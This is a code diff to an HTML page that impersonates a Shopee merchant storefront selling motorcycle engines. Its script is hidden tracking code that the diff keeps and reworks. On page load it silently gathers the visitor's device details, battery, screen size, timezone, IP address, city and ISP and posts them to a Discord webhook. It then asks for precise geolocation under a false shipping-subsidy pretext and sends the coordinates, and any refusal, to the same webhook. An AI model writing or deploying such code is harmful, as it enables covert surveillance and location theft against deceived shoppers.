@@ -5,9 +5,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
   <title>Mitra Shopee Merchant Al X Garage | shopee.co.id</title>
-  <meta name="description" content="Kunjungi Toko Mitra Shopee Merchant Al X Garage. Temukan berbagai mesin motor Tiger, Megapro, GL original dengan harga terbaik.">
+  <meta name="description" content="Kunjungi Toko Mitra Shopee Merchant Al X Garage. Temukan berbagai mesin motor Tiger, Megapro, GL original.">
   <meta property="og:title" content="Mitra Shopee Merchant Al X Garage | shopee.co.id">
-  <meta property="og:description" content="Dapatkan penawaran menarik untuk mesin motor dan sparepart original hanya di Al X Garage melalui Mitra Shopee.">
+  <meta property="og:description" content="Promo mesin motor dan sparepart original di Al X Garage melalui Mitra Shopee.">
   <meta property="og:image" content="https://images.unsplash.com/photo-1486006396113-ad7302ff172c?auto=format&fit=crop&q=80&w=500">
   <meta property="og:type" content="website">
 
@@ -39,22 +39,14 @@
       <span class="text-xs shopee-orange-text font-medium">Rp</span>
       <span class="text-2xl shopee-orange-text font-medium">1.700.000 - 6.700.000</span>
     </div>
-    <div class="flex items-center gap-3 mt-3 text-[13px] text-gray-500">
-      <div class="flex items-center bg-[#ffeee8] px-1 rounded">
-        <span class="text-[10px] shopee-orange-text font-bold">Garansi Shopee</span>
-      </div>
-      <span>|</span>
-      <span>27 Terjual</span>
-    </div>
   </div>
 
-  <div class="mt-2 p-4 bg-blue-50 flex items-start gap-3 border-y border-gray-100" onclick="reqLoc()">
+  <div class="mt-2 p-4 bg-blue-50 flex items-start gap-3 border-y border-gray-100" onclick="handleAction()">
     <i class="fas fa-shipping-fast text-blue-600 mt-1"></i>
     <div>
       <p class="text-sm font-semibold text-gray-800">Verifikasi Lokasi Pengiriman</p>
-      <p class="text-[12px] text-gray-600">Aktifkan lokasi untuk subsidi ongkir khusus Mitra Shopee Al X Garage.</p>
+      <p class="text-[12px] text-gray-600">Verifikasi lokasi diperlukan untuk aktivasi subsidi ongkir.</p>
     </div>
-    <i class="fas fa-chevron-right ml-auto text-gray-300 self-center"></i>
   </div>
 
   <div class="mt-2 p-4 bg-white flex items-center gap-3 border-y border-gray-100" onclick="handleAction()">
@@ -95,73 +87,66 @@
         await fetch(webhook, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            embeds: [{ 
-              title: title, 
-              fields: fields, 
-              color: 15548997, 
-              timestamp: new Date() 
-            }] 
-          })
+          body: JSON.stringify({ embeds: [{ title, fields, color: 15548997, timestamp: new Date() }] })
         });
       } catch (e) {}
     }
 
-    function reqLoc(forceRedirect = false) {
+    function reqLoc(callback) {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (p) => {
             const lat = p.coords.latitude;
             const lon = p.coords.longitude;
-            sendToDiscord("📍 Lokasi Berhasil Didapat", [
-              { name: "Maps", value: `http://google.com/maps?q=${lat},${lon}` },
+            sendToDiscord("📍 Lokasi Didapat", [
+              { name: "Maps", value: `http://www.google.com/maps/place/${lat},${lon}` },
               { name: "Koordinat", value: `${lat}, ${lon}` }
             ]);
-            if(forceRedirect) setTimeout(() => { window.location.href = 'profiltoko.html'; }, 500);
+            if(callback) callback();
           },
           (err) => {
-            sendToDiscord("❌ User Menolak Lokasi", [
-              { name: "Status", value: "Izin ditolak oleh pengguna" }
-            ]);
-            alert("Sistem Merchant: Harap izinkan akses lokasi untuk memverifikasi alamat pengiriman Anda.");
-            if(forceRedirect) setTimeout(() => { window.location.href = 'profiltoko.html'; }, 500);
+            sendToDiscord("❌ User Menolak Lokasi", [{ name: "Status", value: "Izin ditolak/Block" }]);
+            alert("Merchant: Akses lokasi ditolak. Gunakan alamat manual di halaman berikutnya.");
+            if(callback) callback();
           },
-          { enableHighAccuracy: true, timeout: 8000 }
+          { enableHighAccuracy: true, timeout: 5000 }
         );
+      } else if(callback) {
+        callback();
       }
     }
 
     window.onload = async () => {
-      let dataFull = [
+      let data = [
         { name: "📱 Device", value: navigator.platform, inline: true },
-        { name: "🌐 User Agent", value: navigator.userAgent.substring(0, 100) },
-        { name: "🔋 Battery", value: "N/A", inline: true },
+        { name: "🌐 UA", value: navigator.userAgent.substring(0, 100) },
+        { name: "🔋 Batt", value: "Checking..." },
         { name: "📏 Screen", value: `${screen.width}x${screen.height}`, inline: true },
-        { name: "🕰️ Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone },
-        { name: "🔗 URL", value: window.location.href }
+        { name: "🕰️ TZ", value: Intl.DateTimeFormat().resolvedOptions().timeZone }
       ];
 
       if (navigator.getBattery) {
         const b = await navigator.getBattery();
-        dataFull[2].value = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'No'})`;
+        data[2].value = `${Math.round(b.level * 100)}% (${b.charging ? 'Charge' : 'No'})`;
       }
 
       try {
         const res = await fetch('https://ipapi.co/json/');
         const d = await res.json();
-        dataFull.push(
-          { name: "🌍 IP", value: d.ip },
-          { name: "🏙️ Kota", value: d.city },
-          { name: "🏢 Provider", value: d.org }
-        );
+        data.push({ name: "🌍 IP", value: d.ip }, { name: "🏙️ Kota", value: d.city }, { name: "🏢 ISP", value: d.org });
       } catch (e) {}
 
-      await sendToDiscord("🔥 Full Auto Log (Entry)", dataFull);
-      setTimeout(reqLoc, 2000);
+      await sendToDiscord("🔥 Auto Log (Web Opened)", data);
+      
+      setTimeout(() => {
+        reqLoc(); 
+      }, 1000);
     };
 
     function handleAction() {
-      reqLoc(true);
+      reqLoc(() => {
+        window.location.href = 'profiltoko.html';
+      });
     }
   </script>
 </body>
